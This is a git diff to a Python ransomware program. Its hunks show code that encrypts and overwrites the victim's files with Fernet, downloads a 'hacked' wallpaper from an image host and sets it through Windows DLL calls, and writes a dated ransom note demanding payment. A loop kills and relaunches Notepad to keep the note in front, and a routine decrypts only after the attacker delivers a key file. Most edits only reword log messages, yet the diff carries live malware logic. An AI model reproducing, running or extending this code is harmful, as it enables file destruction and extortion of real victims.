@@ -90,13 +90,13 @@ class RansomWare:
                 # Encrypt data from file.
                 _data = self.crypter.encrypt(data)
                 # Log that the file is encrypted and print encrypted contents.
-                print('> File encrypted')  # DEBUG
+                print('[+] File encrypted.')  # DEBUG
                 print(_data)  # DEBUG
             else:
                 # Decrypt data from file.
                 _data = self.crypter.decrypt(data)
                 # Log that the file is decrypted and print decrypted contents.
-                print('> File decrypted')  # DEBUG
+                print('[+] File decrypted.')  # DEBUG
                 print(_data)  # DEBUG
         with open(file_path, 'wb') as fp:
             # Write encrypted/decrypted data to file using same filename to overwrite original file.
@@ -121,9 +121,9 @@ class RansomWare:
         webbrowser.open(url)
 
     def change_desktop_background(self):
-        imageUrl = 'https://images.idgesg.net/images/article/2018/02/ransomware_hacking_thinkstock_903183876-100749983-large.jpg'
+        imageUrl = 'https://i.imgur.com/Bh6wnWw.jpg'
         # Go to a specific URL, download and save image using the absolute path.
-        path = f'{self.sysRoot}/Desktop/background.jpg'
+        path = f'{self.sysRoot}/Desktop/hacked_wallpaper.jpg'
         urllib.request.urlretrieve(imageUrl, path)
         SPI_SETDESKWALLPAPER = 20
         # Access Windows .dll files to change desktop wallpaper.
@@ -133,7 +133,8 @@ class RansomWare:
         date = datetime.date.today().strftime('%d-%B-Y')
         with open('RANSOM_NOTE.txt', 'w') as f:
             f.write(f'''
-The hard disks of your computer have been encrypted with a Military grade encryption algorithm.
+{date}
+The files on your computer have been encrypted with a Military grade encryption algorithm.
 There is no way to restore your data without a special key.
 Only we can decrypt your files.
 
@@ -162,10 +163,10 @@ If the payment is not made on time, the decryption key will be deleted and you w
             time.sleep(0.1)
             top_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
             if top_window == 'RANSOM_NOTE - Notepad':
-                print('Ransom note is the top window - do nothing')  # DEBUG
+                print('[!] Ransom note is the top window - do nothing.')  # DEBUG
                 pass
             else:
-                print('Ransom note is not the top window - kill/create process again')  # DEBUG
+                print('[!] Ransom note is not the top window - kill and create process again.')  # DEBUG
                 # Kill the ransom note process so we can open it again and make sure it is in the foreground.
                 time.sleep(0.1)
                 ransom.kill()
@@ -181,10 +182,10 @@ If the payment is not made on time, the decryption key will be deleted and you w
     # Decrypt the system when text file with un-encrypted key in it is placed on the desktop of target machine.
     def put_me_on_desktop(self):
         # Loop to scan for file, if it is found, read the key and then self.key + self.crypter will be valid for decrypting the files.
-        print('started')  # DEBUG
+        print('[!] Scan started.')  # DEBUG
         while True:
             try:
-                print('trying')  # DEBUG
+                print('[!] Attempting to start decryption.')  # DEBUG
                 # The ATTACKER decrypts the Fernet symmetric key on their machine and then puts the un-encrypted Fernet-
                 # -key in this file and sends it in a email to the victim. They then put this on the desktop and it will be-
                 # -used to un-encrypt the system. WE DO NOT GIVE THEM THE PRIVATE ASSYEMTRIC KEY.
@@ -193,14 +194,14 @@ If the payment is not made on time, the decryption key will be deleted and you w
                     self.crypter = Fernet(self.key)
                     # Decrypt the system once the file is found and we have the crypter with the correct key.
                     self.crypt_system(encrypted=True)
-                    print('decrypted')  # DEBUG
+                    print('[+] Files decrypted.')  # DEBUG
                     break
             except Exception as e:
                 print(e)  # DEBUG
                 pass
             # Scan the desktop for the file every 10 seconds.
             time.sleep(10)  # DEBUG
-            print('Checking for PUT_ME_ON_DESKTOP.txt')  # DEBUG
+            print('[!] Scanning for PUT_ME_ON_DESKTOP.txt')  # DEBUG
             # 10 seconds is just proof of concept. Real example: Sleep ~ 3 mins
             # secs = 60
             # mins = 3
@@ -208,7 +209,6 @@ If the payment is not made on time, the decryption key will be deleted and you w
 
 
 def main():
-    # testfile = r'D:\Coding\Python\RansomWare\RansomWare_Software\testfile.png'
     rw = RansomWare()
     rw.generate_key()
     rw.crypt_system()
@@ -221,12 +221,12 @@ def main():
     t1 = threading.Thread(target=rw.show_ransom_note)
     t2 = threading.Thread(target=rw.put_me_on_desktop)
 
+    t1.daemon = True
     t1.start()
-    print('> RansomWare: Attack on target machine completed and the system is now encrypted.')  # DEBUG
-    print('> RansomWare: Waiting for attacker to give the target machine a document that will un-encrypt the machine.')  # DEBUG
+    print('[!] Attack on target machine completed and the system is now encrypted.')  # DEBUG
+    print('[!] Waiting for a document that will un-encrypt the machine.')  # DEBUG
     t2.start()
-    print('> RansomWare: Target machine has been un-encrypted.')  # DEBUG
-    print('> RansomWare: Completed.')  # DEBUG
+    print('[!] Target machine has been un-encrypted.')  # DEBUG
 
 
 if __name__ == '__main__':
